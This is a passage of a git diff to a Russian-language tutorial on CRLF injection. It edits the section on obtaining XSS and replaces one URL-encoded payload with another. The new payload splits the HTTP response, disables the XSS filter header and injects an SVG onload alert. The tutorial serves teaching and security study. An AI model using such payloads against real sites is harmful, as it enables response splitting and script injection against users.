@@ -38,13 +38,13 @@ CRLF-injection представляет собой тип атаки, испол
 ### Получение XSS
 
 Для достижения данной цели делаем все то же самое, что и в пункте 1 с той оговоркой, что необходимо после символа переноса строки использовать иные заголовки
-`12%0d%0aContent-Length%3A35%0d%0aX-XSS-Protection%3A0%0d%0a%0d%0a23%0d%0a%3Csvg%20onload%3Dalert%28document.domain%29%3E%0d%0a0%0d%0a%2F%2f%2e%2e`
+`%0d%0aContent-Length%3A35%0d%0aX-XSS-Protection%3A0%0d%0a%0d%0a%3Csvg%20onload%3Dalert%28"XSS"%29%3E%0d%0a0%0d%0a%2F%2f%2e%2e`
 
 ![Реализации CRLF-инъекции для XSS.png](https://github.com/karpuna3/shift2019/blob/master/crlf/img/Реализации%20CRLF-инъекции%20для%20XSS.png)
 
 Рисунок 3. Реализации CRLF-инъекции для XSS
 
-![](https://github.com/karpuna3/shift2019/blob/master/crlf/img/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA.PNG?raw=true)
+![Результат получения XSS.png](https://github.com/karpuna3/shift2019/blob/master/crlf/img/Результат%20получения%20XSS.png)
 
 Рисунок 4. Результат получения XSS
 ### Замена информации полученной пользователем
